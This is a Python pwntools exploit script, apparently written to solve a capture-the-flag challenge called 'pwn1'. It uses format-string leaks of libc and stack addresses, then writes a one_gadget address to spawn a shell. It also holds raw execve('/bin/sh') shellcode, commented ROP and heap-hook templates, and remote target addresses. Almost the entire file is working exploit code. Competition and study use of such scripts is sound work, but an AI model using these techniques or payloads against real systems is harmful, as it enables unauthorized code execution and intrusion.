# -*- coding: utf-8 -*-
from pwn import *
from libformatstr import FormatStr
context.log_level = 'debug'
# context.terminal=['tmux','splitw','-h']
context(arch='amd64', os='linux')
# context(arch='i386', os='linux')
local = 1
elf = ELF('./pwn1')
if local:
    p = process('./pwn1')
    libc = elf.libc
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#onegadget64(libc.so.6)
#more onegadget
#one_gadget -l 200 /lib/x86_64-linux-gnu/libc.so.6
one64 = [0x45226,0x4527a,0xf0364,0xf1207]
# [rax == NULL;[rsp+0x30] == NULL,[rsp+0x50] == NULL,[rsp+0x70] == NULL]
#onegadget32(libc.so.6) 
# one32 = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]

# py32 = fmtstr_payload(start_read_offset,{xxx_got:system_addr})
# sl(py32)
# py64 = FormatStr(isx64=1)
# py64[printf_got] = onegadget
# sl(py64.payload(start_read_offset))

# shellcode = asm(shellcraft.sh())
shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' 
shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'
#shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'


sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def debug(mallocr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print }}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+mallocr)))
    else:
        gdb.attach(p,"b *{}".format(hex(mallocr)))

# with open('1.txt','wb+') as f:
#     s = ""
#     for i in shellcode:
#         s += "0x" + i.encode("hex")
#     for i in s:
#         f.write(i)

# def mid_overflow(offset,func_got,rdi,rsi,rdx,next_func):
# 	payload = ''
# 	payload += 'a'*offset
#   payload += 'aaaaaaaa'
# 	payload += p64(pppppp_ret)
# 	payload += p64(0)
# 	payload += p64(0)
# 	payload += p64(1)
# 	payload += p64(func_got)
# 	payload += p64(rdx)
# 	payload += p64(rsi)
# 	payload += p64(rdi)
# 	payload += p64(mov_ret)
# 	payload += p64(0)
# 	payload += p64(0)
# 	payload += p64(0)
# 	payload += p64(0)
# 	payload += p64(0)
# 	payload += p64(0)
# 	payload += p64(0)
# 	payload += p64(next_func)
# 	ru('Input:\n')
# 	sd(payload)

def malloc(size,content):
    ru("> ")
    sl('1')
    ru()
    sl(str(size))
    ru()
    sd(content)
def free(index):
    ru("> ")
    sl('3')
    ru()
    sl(str(index))
def edit(index,content):
    ru("> ")
    sl('2')
    ru()
    sl(str(index))
    ru()
    sd(content)
def show(index):
    ru("> ")
    sl('4')
    ru()
    sl(str(index))
def ppwn(py):
	ru(">>> ")
	sl(py)

ru("Use 'q' or Ctrl-D (i.e. EOF) to exit")

ppwn("%11$paa%8$p")
rc(1)
libc_base = int(rc(14),16)-240-libc.sym["__libc_start_main"]
print "libc_base--->"+hex(libc_base)
ru("aa")
stack = int(rc(14),16)
print "stack--->" + hex(stack)
kk = (stack+8)&0xffff
debug(0x000000004007A1,0)
py = ''
py += "%"+str(kk)+"c" + "%13$hn"
ppwn(py)

py = ''
py += "%"+str(kk+2)+"c" + "%27$hn"
ppwn(py)

onegadget = libc_base + one64[1]
print "one--->"+hex(onegadget)

py = ''
py += '%' + str((onegadget>>16) & 0xff)+ "c"+ "%41$hhn"
ppwn(py)

py = ''
py += "%"+str(onegadget & 0xffff) + "c"+ "%39$hn"
ppwn(py)

ppwn('q')




# libc_base = u64(rc(6).ljust(8,'\x00'))
# print "libc_base--->" + hex(libc_base)
# malloc_hook = libc_base + libc.sym["__malloc_hook"]
# fake_chunk = malloc_hook - 0x23
# onegadget = libc_base + one64[2]
# realloc = libc_base + libc.sym["realloc"]
# free_hook = libc_base + libc.sym["__free_hook"]
# system = libc_base + libc.sym["system"]
# binsh = libc_base + libc.search("/bin/sh").next()




# i = 0
# while 1:
#     print i
#     i += 1
#     try:
#         pwn()
#     except EOFError:
#         p.close()
#         local = 1
#         elf = ELF('./note_five')
#         if local:
#             p = process('./note_five')
#             libc = elf.libc
#             continue
#         else:
#             p = remote('121.40.246.48',9999)
#             libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#     else:
#         sl("ls")
#         break
p.interactive()